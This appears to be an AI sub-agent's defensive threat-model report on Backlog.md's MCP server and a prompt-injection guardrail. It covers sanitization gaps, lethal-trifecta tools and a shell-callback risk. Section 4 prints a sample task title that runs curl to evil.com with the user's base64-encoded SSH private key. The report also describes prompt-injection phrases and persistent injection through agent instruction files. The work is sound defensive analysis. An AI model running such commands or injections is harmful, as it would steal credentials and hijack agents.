# SPIKE-MIG.1.5 — Threat model fit (Backlog.md vs Constitutional Guardrail)

**Agent E · Wave 2 · 2026-05-18 · DeepWiki-only (gh api sandbox-blocked)**

**Headline verdict: CONDITIONAL PASS** — Constitutional Guardrail composes cleanly on top of Backlog.md's existing defenses with **one hard conflict (`onStatusChange` shell-callback feature)** that the Guardrail's PreToolUse hook MUST explicitly block, plus several gap-fill opportunities.

---

## Section 1: MCP server input handling audit

Quote-level evidence from DeepWiki on `MrLesk/Backlog.md`:

> "The core of this validation is handled by the `validateInput` function in `src/mcp/validation/validators.ts`. This function takes an input object and a `JsonSchema` to perform checks such as type validation, `minLength`, `maxLength`, `enum` validation, and `additionalProperties` restrictions."

> "For string inputs, the `validateField` function, which is called by `validateInput`, applies sanitization using `sanitizeString` or `sanitizeStringPreserveWhitespace`. The `sanitizeString` function removes null bytes, trims whitespace, and normalizes line endings."

**`sanitizeString` source** (verbatim from DeepWiki):

```typescript
/**
 * Sanitizes string input to prevent various injection attacks
 */
function sanitizeString(input: string): string {
    if (typeof input !== "string") {
        return String(input);
    }
    // Remove null bytes
    let sanitized = input.replace(/\0/g, "");
    // Trim whitespace
    sanitized = sanitized.trim();
    // Normalize line endings
    sanitized = sanitized.replace(/\r\n/g, "\n").replace(/\r/g, "\n");
    return sanitized;
}
```

**Per-field length caps** (from `src/mcp/utils/schema-generators.ts`):

| Field | `minLength` | `maxLength` |
|---|---|---|
| `title` (create) | 1 | 200 |
| `title` (edit) | — | 200 |
| `description` | — | **10000** |
| `labels[]` (item) | — | 50 |
| `milestone` | 1 | 100 |
| `status` | — | 100 (+ enum + case-insensitive) |
| `assignee[]` (item) | — | 100 |
| `dependencies[]` (item) | — | 50 |
| `acceptanceCriteria[]` (item, create) | — | 500 |
| `implementationNotes` | — | **10000** |
| `notesSet`, `planSet` | — | **20000** |
| `notesAppend[]`, `planAppend[]` (item) | — | 5000 (maxItems 20) |
| `acceptanceCriteriaSet/Add[]` (item) | — | 500 (maxItems 50) |

**Wrapping**: `createSimpleValidatedTool` in `src/mcp/tools/tasks/index.ts` wraps every tool handler with the schema validator before reaching the `Core` business logic. Validation failures return `VALIDATION_ERROR` rather than reaching disk.

**What is NOT sanitized:**
- Markdown / prompt-injection patterns (e.g., `Ignore prior instructions`, `<system>`, fake function-call tags). Per DeepWiki: *"the system does not appear to perform specific HTML or Markdown escaping on user-supplied content when returning it to agents."*
- `sanitizeAppendInput` only trims whitespace and filters empty strings — no content transformation.

**Filename-level path-traversal defense exists separately:**
> "The `sanitizeFilename` function removes characters that could be used for path traversal, such as `/`, `\\`, and `..`. All task files are explicitly saved within the `tasksDir` or `draftsDir` which are subdirectories of the `backlog/` directory."

> "No MCP tools accept a path argument directly. All operations are performed using task IDs, which are then resolved to file paths internally by the `FileSystem` class."

**Bottom-line baseline refutation**: The spike's pre-stated expectation was "zero existing sanitization." This is **wrong** — Backlog.md has meaningful schema-validation + null-byte/whitespace sanitization + path-traversal hardening. What it lacks is **semantic** sanitization (prompt-injection patterns, structural wrapping) — exactly what the Constitutional Guardrail is designed to add.

---

## Section 2: CLI input handling audit

The CLI reaches the same `Core` and `FileSystem` layer as the MCP server. Specifically:

- `backlog task create` and `backlog task edit -d/--description/--ac` go through `TaskHandlers` → `Core.createTaskFromInput` / `Core.updateTask` → `FileSystem.saveTask` (per DeepWiki: *"MCP tool inputs are propagated to the filesystem by first being processed by `TaskHandlers` within the MCP server, which then calls the core `createTaskFromInput` method"*).
- However, **schema validation lives in the MCP layer**, not the CLI layer. The `createSimpleValidatedTool` wrapper is MCP-server-specific. A direct CLI invocation by a user (`backlog task create "..."`) does NOT pass through `validateInput` — it goes straight to `Core`.
- Labels accept free-form strings — there is dynamic enum generation from `BacklogConfig`, but case-insensitive matching means agents can introduce minor variants.
- Filename sanitization (`sanitizeFilename`) DOES apply in both code paths because it sits at the `FileSystem.saveTask` level.

**Implication**: If a user mixes CLI usage with MCP usage (the expected pattern under vp-heddle), the CLI path is the **less-defended surface**. The Constitutional Guardrail hooks on Claude Code's PreToolUse — meaning when an agent runs `bash: backlog task create "..."`, the Guardrail can still intercept the Bash invocation. But direct human-typed CLI bypasses both Guardrail and MCP-schema validation. (Acceptable in threat model — human CLI is trusted.)

---

## Section 3: 6-layer Constitutional Guardrail compatibility matrix

| Layer | Backlog.md current state | Compatibility | Notes |
|---|---|---|---|
| **1. Provenance tier** (tag content by source: user/agent/tool-output/external) | None — Task fields returned verbatim with no source marker. `Core` parses markdown → returns `Task` object → MCP serializes as JSON with no wrapper. | **gap-fill clean** | Guardrail adds tagging when ingesting via PreToolUse hook on MCP responses (PostToolUse direction). No conflict; Backlog.md has nothing to overwrite. |
| **2. Structural wrap** (deterministic boundaries around untrusted content) | DeepWiki: *"There is no additional wrapping or boundary marker around user-supplied content in the MCP response itself."* The internal `<!-- SECTION:DESCRIPTION:BEGIN -->` markers are stripped before agent consumption. | **gap-fill clean** | Guardrail can wrap on the way in (task content destined for description fields) and on the way out (post-tool-response). No interference. |
| **3. Injection-marker flag-don't-block** (detect "Ignore prior instructions" et al.) | None — DeepWiki: *"no explicit 'escaping' of task content for prompt injection purposes"*. | **gap-fill clean** | Guardrail's regex pass over title/description/notes inputs has nothing to conflict with. |
| **4. Markdown-prompt-mimicry strip** (fake `<system>` tags, fake function calls) | None — markdown is the storage format; mimicry patterns survive verbatim. | **gap-fill clean** | Guardrail strip-pass composes; the only risk is that vp-heddle skill prose using literal `<system>` examples might trip the filter (manageable: use entity-escaped examples in skill docs). |
| **5. 8KB length cap** (bound any single input) | **Already has length caps, but at different thresholds.** Notes/plan can be **20000 chars (~20KB)** via `notesSet`/`planSet`; description is **10000 (~10KB)**; appends are 5000 per item × 20 items = **100KB** in a single batch. | **conflict — threshold drift** | Backlog.md's 20KB/10KB caps are *looser* than the Guardrail's 8KB. The Guardrail's 8KB cap will reject some legitimately-large Backlog.md inputs. Resolution options: (a) raise Guardrail to 16KB to match worst-case Backlog.md field, (b) keep 8KB and accept rejection (forces agents to split long content — arguably good), or (c) per-field cap matrix mirroring Backlog.md's schema. **Recommend option (b)** — 8KB per single agent call is plenty; agents splitting content surfaces intent, which is the Guardrail's job. |
| **6. Lethal-trifecta interlock** (untrusted-input + sensitive-tool + private-data → block) | None — Backlog.md happily executes any MCP call from any caller. Plus `onStatusChange` (see Section 4) creates a *separate* trifecta amplifier on its own. | **gap-fill clean for tool-call gating** + **net-new threat from onStatusChange** | Guardrail composes for the tool-call dimension. But onStatusChange is a Guardrail-layer-zero concern (it ships in the upstream data, not in agent inputs the hook sees). |

**Summary scoreboard**: 4 layers gap-fill cleanly, 1 layer conflicts on threshold (resolvable), 1 layer (#6) has a net-new threat outside the Guardrail's PreToolUse interception scope (see Section 4).

---

## Section 4: Lethal-trifecta tool inventory

### Trifecta criteria for the Backlog.md MCP surface

For each MCP tool, evaluate: (1) accepts untrusted input, (2) writes durable state OR triggers side effects, (3) provides a private-data exfiltration channel OR escapes to external systems.

| Tool | Untrusted input? | Sensitive (durable/side-effect)? | Exfil channel? | Trifecta? |
|---|---|---|---|---|
| `task_create`, `task_edit` | Y (title/desc/labels/notes) | Y (file writes) | Conditionally — see `onStatusChange` below | **Y if onStatusChange configured** |
| `task_archive`, `task_complete` | Y (id) | Y (file moves) | N | N |
| `task_list`, `task_view`, `task_show` | Y (filters) | N | Y (returns unwrapped task content to agent — content can contain injection) | **Y** (read-side trifecta: stored injection from prior write reaches agent context) |
| `doc_create`, `doc_update` | Y (title/body) | Y (file writes to `backlog/docs/`) | N (no callback equivalent documented) | N |
| `doc_search`, `doc_view`, `doc_list` | Y (queries) | N | Y (same as task_view) | **Y** (read-side) |
| `decision_create` | Y | Y (file write) | N | N |
| `milestone_add/rename/remove` | Y | Y (file writes) | N | N |
| `board_export` (CLI; not confirmed as MCP tool) | Y (filename) | Y (writes anywhere in CWD with `--readme` flag updating `README.md`) | Potentially | **Y if exposed via MCP** — CLI accepts `[filename]` arg and `--readme` updates `README.md` outside `backlog/`. DeepWiki was unclear whether this is MCP-exposed; spike flags as **uncrossverified — confirm in Phase 2b**. |
| `agents --update-instructions` (CLI) | Y | Y (writes `CLAUDE.md`, `AGENTS.md`, `GEMINI.md`, `.github/copilot-instructions.md`) | **Yes — these files are auto-loaded next session** | **Y if MCP-exposed** — same caveat as board_export. **Highest-severity if exposed** because it writes to files Claude Code consumes at SessionStart. |

### Path-traversal escape audit

DeepWiki confirms: *"No MCP tools accept a path argument directly. All operations are performed using task IDs"* and `sanitizeFilename` strips `/`, `\\`, `..`. **Path-traversal via MCP MCP-tool surface: blocked.**

**But:**
- `board_export` (CLI-confirmed) accepts arbitrary `[filename]` and `--readme` updates `README.md` — these are **CLI-surface paths outside `backlog/`**. If `board_export` is also exposed via MCP, this is a path-write-anywhere primitive.
- `agents --update-instructions` writes to specific known paths (`CLAUDE.md` et al.) — no path traversal, but the destinations are themselves agent-instruction files, which is arguably worse than path traversal.
- Config write: `~/.backlog/user` is a global config file outside the project. CLI-confirmed; MCP-exposure uncertain.

### Net-new threat: `onStatusChange` shell-callback

This is the standout finding. From DeepWiki:

> "The `onStatusChange` callback feature allows you to execute a shell command when a task's status changes. This callback can be configured both globally and on a per-task basis. The command execution mechanism uses `bun.spawn` with `sh -c`. The command string is templated with task field values passed as environment variables."

> "A malicious task with a crafted title or label could potentially trigger arbitrary command execution because the `TASK_TITLE` variable is injected into the environment, and the command is executed via `sh -c`."

> The Backlog.md project's own task-321 implementation notes acknowledge: *"Commands run with user's shell permissions. Document that users should be careful with repos from untrusted sources."*

**Threat chain:**
1. Agent reads an untrusted task (e.g., from a `git pull` of a feature branch, or a synced sibling-project tasks dir, or a malicious PR contributor's edit).
2. Agent invokes `task_edit ... --status In\ Progress`.
3. If `onStatusChange` is set globally with `bash -c "echo $TASK_TITLE >> /tmp/log"`, and a malicious title is `"; curl evil.com/$(cat ~/.ssh/id_rsa | base64); echo "`, then `TASK_TITLE` is passed as an env var — but env-var interpolation in `sh -c "$TASK_TITLE"` (if the global command does that) becomes arbitrary code.
4. Even without command-string interpolation, **the existence of any `onStatusChange` callback in untrusted-repo state means status changes can side-effect.** This is the **Clinejection precedent** (Feb 2026 — crafted GitHub issue title → CI/CD bot → arbitrary command execution → npm supply chain compromise affecting ~4k devs). The vector is structurally identical.

---

## Section 5: Threat model verdict (3 buckets)

### Pass-through risks (Guardrail composes cleanly)

- **Prompt-injection in description/notes** — Backlog.md doesn't mitigate; Guardrail layers 3+4 catch on write, layer 2 (structural wrap) marks on read.
- **Markdown-mimicry of system tags** — Backlog.md returns verbatim; Guardrail layer 4 strips on response interception.
- **Tool-call lethal-trifecta on `task_list`/`doc_view`** — read-side trifecta (stored injection reaches agent context). Guardrail layer 6 gates whether sensitive *follow-up* tools (file writes, network calls) can fire after reading an unwrapped agent-controlled string. Backlog.md doesn't gate; Guardrail does.
- **Length-amplification via append batches** (`notesAppend` × 20 × 5000 chars = 100KB). Guardrail's per-call 8KB cap rejects oversized batches; Backlog.md allows them.

### Conflict risks (Guardrail vs Backlog.md)

- **Length-cap threshold drift (8KB Guardrail vs 10KB/20KB Backlog.md)**. Resolution: keep Guardrail at 8KB; legitimate use cases that need more should split content (forcing intent through agent-visible boundaries). **No code conflict, just a UX tradeoff.**
- **`sanitizeString` normalization** (null-byte strip, CRLF→LF) happens *before* Guardrail sees the content if the Guardrail intercepts the Backlog.md JSON-RPC response. The Guardrail's injection-marker detection regex should account for already-normalized line endings (trivial: use `\n` matching, not `\r?\n`).

### Net-new threats (introduced by Backlog.md design, not in current bd setup)

- **🔴 `onStatusChange` callback (HIGH)**: Per-task and global shell command execution on status change. Templated with `$TASK_TITLE` (and other unsanitized agent-controlled fields). This is **out of Guardrail PreToolUse hook scope** — it fires inside Backlog.md's own process, after schema validation. Mitigations:
  1. **Phase 2b MUST add a Backlog.md PreToolUse hook check that blocks `task_edit ... --status` (and any other status-changing tool) if any `onStatusChange` is configured in the repo or globally.**
  2. OR fork `Backlog.md` to remove the feature.
  3. OR file an upstream FR for `--no-callbacks` flag and gate the Backlog.md MCP server invocation with it.
- **🟡 `agents --update-instructions` write to `CLAUDE.md`/`AGENTS.md`/`GEMINI.md` (MEDIUM)**: If MCP-exposed (uncrossverified), this lets agent-supplied content land in files auto-loaded at next SessionStart. Persistent prompt injection across sessions. Mitigation: Guardrail PreToolUse blocks any MCP tool matching `agents_*` or `instructions_*`.
- **🟡 `board_export --readme` writes to project `README.md` (MEDIUM)**: README writes are durable and human-reviewed less than they should be. Mitigation: Guardrail PreToolUse blocks any MCP tool that accepts a `filename` argument resolving outside `backlog/`.
- **🟡 YAML frontmatter parsing of task files (MEDIUM)**: Backlog.md parses YAML on every task read. If a malicious frontmatter exploits a YAML deserializer vuln (unlikely in `js-yaml` SAFE_SCHEMA mode, possible if unsafe loader used), arbitrary objects could land in the `Task` object. Spike did NOT verify which YAML parser Backlog.md uses or its safety mode. **Phase 2b should audit the YAML loader.**
- **🟢 Filename sanitization is well-handled (LOW)**: Path-traversal blocked via `sanitizeFilename`. Confirmed by DeepWiki + task-328 implementation notes.

---

## Section 6: Recommendations for Phase 2b Constitutional Guardrail

The Guardrail PreToolUse hook (~60 LOC target) MUST specifically check:

1. **Block `task_edit`/`task_create` calls with `status` when `onStatusChange` is configured.** Read `backlog/config.yml` at hook init; if `onStatusChange` is set globally or in any task frontmatter, refuse status-change tool calls and surface to user. **Highest priority — this is the only HIGH-severity net-new threat.** Pattern reference: Willison Agents Rule of Two — the Backlog.md MCP server with `onStatusChange` enabled meets all three lethal-trifecta criteria as a single tool call.

2. **Block any MCP tool name matching `agents_*`, `instructions_*`, or with a `filename` argument resolving outside `backlog/`.** Even if these aren't MCP-exposed today (uncrossverified — `gh api` sandbox-blocked), Backlog.md is in active development (45 releases in 11 months); the surface expands and the Guardrail should be allowlist-shaped, not blocklist-shaped. **Recommend per-tool allowlist** of the ~20 expected MCP tools used by vp-heddle skills; reject anything else.

3. **Apply layers 1–4 of the Guardrail (provenance tier, structural wrap, injection-marker flag, markdown-mimicry strip) to all string inputs in MCP tool calls, AND to all string outputs in MCP tool responses.** Backlog.md does layer-zero null-byte/CRLF normalization but no semantic checks — Guardrail fills the entire semantic layer. Outputs matter because `task_list`/`task_view` is the read-side trifecta vector.

4. **Set Guardrail length cap at 8KB and accept the threshold drift below Backlog.md's 10KB/20KB schema maxes.** Splitting forces intent surfacing. Document the tradeoff in vp-heddle skill prose so agents know to split long writes.

5. **Audit Backlog.md's YAML frontmatter parser at Phase 2b kickoff** (separate task, ~30 min). Confirm `js-yaml` `SAFE_SCHEMA`/`FAILSAFE_SCHEMA` or equivalent. File upstream FR if unsafe mode is in use. If unsafe, Guardrail cannot mitigate (parsing happens inside Backlog.md before the hook sees anything).

6. **(Bonus) File upstream FR with MrLesk** for a `--no-callbacks` runtime flag for `backlog mcp start`. This is the cleanest mitigation for finding #1 and serves the broader Backlog.md user base. Frame as: "agent-driven repos with untrusted task content need a callback-disabled mode." Likely accepted given MrLesk's own task-321 notes acknowledge the risk.

---

## Methodology + caveats

- **DeepWiki only — uncrossverified.** `gh api` was sandbox-blocked for this sub-agent (Permission denied on `gh api repos/MrLesk/Backlog.md`). All source quotes are from DeepWiki responses; DeepWiki is known to occasionally hallucinate (Agent A's Wave 1 flag). High-confidence findings: the validation/sanitization architecture (cross-corroborated across 4 separate DeepWiki queries with consistent file paths and identifiers — `src/mcp/validation/validators.ts`, `src/mcp/utils/schema-generators.ts`, `src/mcp/tools/tasks/index.ts`). Medium-confidence findings: the `onStatusChange` mechanism (single DeepWiki query but with rich code-level detail and explicit task-321 reference). Low-confidence: the MCP-exposure status of `board_export --readme` and `agents --update-instructions` — flagged for Phase 2b confirmation.
- **Tavily search** for "Backlog.md CVE / security vulnerability / prompt injection" returned no Backlog.md-specific advisories. Closest tangentially relevant precedent: **Clinejection (Feb 2026)** — crafted GitHub issue title triggered Claude-powered CI/CD bot to execute arbitrary commands, leading to npm supply chain compromise affecting ~4k developers. Cited in Section 4 as the structural analog for the `onStatusChange` threat chain.
- **Time spent**: ~30 minutes (under the 45-min cap).
- **Baseline expectation refuted**: the spike's pre-stated "expect zero existing sanitization" was wrong. Backlog.md has a meaningful validation layer; it just doesn't have a *semantic* one. This is good news for Phase 2b — the layers compose cleanly because they target different concerns.
